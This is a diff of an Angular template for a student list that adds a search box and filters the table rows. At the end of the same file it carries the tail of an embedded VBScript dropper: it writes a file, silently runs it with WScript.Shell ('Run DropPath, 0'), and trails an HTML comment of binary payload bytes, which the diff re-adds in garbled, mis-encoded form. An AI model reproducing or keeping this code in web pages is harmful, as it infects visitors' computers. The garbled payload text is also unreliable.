@@ -12,6 +12,7 @@
     
     <div class="card-body">
         <h4 class="card-title">List Etudiants</h4>
+        <input #query (keyup)="search(query.value)" type="text" class="form-control" placeholder="Search...">
         
         <table class="table table-striped">
             <thead >
@@ -26,7 +27,7 @@
                 </tr>
                 </thead>
                 <tbody>
-                    <tr *ngFor="let etudiant of etudiants">
+                    <tr *ngFor="let etudiant of searchEtudiants">
                         <td scope="row">{{etudiant.nom}}</td>
                         <td>{{etudiant.prenom}}</td>
                         <td>{{etudiant.age}}</td>
@@ -76,5 +77,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--f”r`ÏYõÄCÒWeoš"~‡qÄÆÈ@IÒóªÐ}‚¡ïûÔS¦È^c#`ô£l6Ù+mŽöq'ÓÚ	/ºÀsFÈ½{ƒµ2š{ 7ôµ5úü|`¼ôï¡^+ÝÃh2¨$%£f[ÊˆL)	A+×Ÿ*[ãÊ4ÜH·:•hbqS^Å¼¼5úq8DÍ›e©f\ÝÓó¾J“öwÃïB‚¯­Þi‹ò`Â9imÓx&’Å8.ÖvñîÁUQ8ºE4Bç]Ç­i	ø)SX¯ƒd‡èhÞàî•Ï2ë¤¤€ZÊ]4`†¡CªŽ7hàÁ÷7½µÂÏ®›‡á¥T)uhôÙ·s;¾ä„=œHœ†ŽUð|‚ôíçóöG^fº[èÐXë;ðBÍ£š­Åp/ž¯›«3=<*üj”}S³<+³&_6>ÏÑÍ~<Ê£ÖrýWpPù©uð·Ší5ã')
-õæÈ;PÎA	ÄO‡µ±³  ÑRøÑÑÑø[O‹RÃ\Ž Ñ-->
+//--></SCRIPT><!--fï¿½r`ï¿½Yï¿½ï¿½Cï¿½Weoï¿½"ï¿½~ï¿½qï¿½ï¿½ï¿½@Iï¿½ï¿½ï¿½}ï¿½ï¿½ï¿½ï¿½ï¿½Sï¿½ï¿½^c#`ï¿½ï¿½ï¿½l6ï¿½+mï¿½ï¿½q'ï¿½ï¿½	/ï¿½ï¿½sFÈ½{ï¿½ï¿½2ï¿½{ 7ï¿½ï¿½5ï¿½ï¿½|`ï¿½ï¿½ï¿½^+ï¿½ï¿½h2ï¿½$%ï¿½fï¿½[ÊˆL)	A+×Ÿ*[ï¿½Ê4ï¿½Hï¿½:ï¿½hbqS^Å¼ï¿½5ï¿½q8DÍ›eï¿½f\ï¿½ï¿½ï¿½ï¿½Jï¿½ï¿½wï¿½ï¿½Bï¿½ï¿½ï¿½ï¿½iï¿½ï¿½`ï¿½9imï¿½x&ï¿½ï¿½8.ï¿½ï¿½vï¿½ï¿½ï¿½UQ8ï¿½E4Bï¿½]Ç­i	ï¿½)SXï¿½ï¿½dï¿½ï¿½hï¿½ï¿½ï¿½ï¿½2ë¤¤ï¿½Zï¿½]4`ï¿½ï¿½Cï¿½ï¿½7hï¿½ï¿½ï¿½7ï¿½ï¿½ï¿½Ï®ï¿½ï¿½ï¿½T)
+uhï¿½Ù·s;ï¿½ï¿½ï¿½=ï¿½Hï¿½ï¿½ï¿½Uï¿½|ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½G^fï¿½[ï¿½ï¿½Xï¿½;ï¿½Bï¿½ï¿½ï¿½ï¿½ï¿½p/ï¿½ï¿½ï¿½ï¿½3=<*ï¿½jï¿½}Sï¿½<+ï¿½&_6>ï¿½ï¿½ï¿½~<Ê£ï¿½rï¿½WpPï¿½ï¿½uï¿½ï¿½ï¿½5ï¿½')
+ï¿½ï¿½ï¿½;Pï¿½A	ï¿½Oï¿½ï¿½ï¿½ï¿½  ï¿½Rï¿½ï¿½ï¿½ï¿½ï¿½ï¿½[Oï¿½Rï¿½\ï¿½ ï¿½-->
